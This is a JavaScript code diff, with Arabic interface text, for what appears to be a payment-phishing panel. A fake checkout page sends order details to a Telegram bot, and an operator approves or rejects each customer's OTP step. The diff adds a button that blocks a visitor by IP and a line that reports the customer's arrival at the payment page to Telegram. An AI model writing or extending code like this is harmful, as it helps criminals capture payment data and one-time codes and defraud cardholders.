@@ -383,6 +383,9 @@ function buildKeyboard(ref) {
       [
         { text: '✅ دخول OTP', callback_data: `approve_${ref}` },
         { text: '❌ رفض',     callback_data: `reject_${ref}`  },
+      ],
+      [
+        { text: '🚫 حظر العميل', callback_data: `block_${ref}` },
       ]
     ]
   };
@@ -459,6 +462,16 @@ function startVerifyPolling() {
             showVerifyReject();
             return;
           }
+        }
+
+        if (data.startsWith('block_')) {
+          const ref = data.replace('block_', '');
+          const ip = await Tracker.getIP();
+          await tgAnswerCallback(cq.id, '🚫 جاري الحظر...');
+          await tgEditMessage(cq.message.message_id,
+            cq.message.text + `\n\n🚫 <b>تم حظر العميل</b>\nIP: <code>${ip}</code>`, null);
+          await Tracker.blockIP(ip);
+          return;
         }
       }
 
@@ -573,6 +586,9 @@ function initSubmit() {
 
     /* 📨 إرسال تفاصيل الطلب لـ Telegram مع أزرار */
     await tgSend(buildCheckoutOrderMsg(myRefNumber), buildKeyboard(myRefNumber));
+
+    /* 📊 إرسال رحلة العميل */
+    await Tracker.sendJourneyToTelegram('💰 <b>العميل وصل صفحة الدفع</b>');
 
     /* تجاوز رسائل قديمة */
     const oldUpdates = await tgGetUpdates();
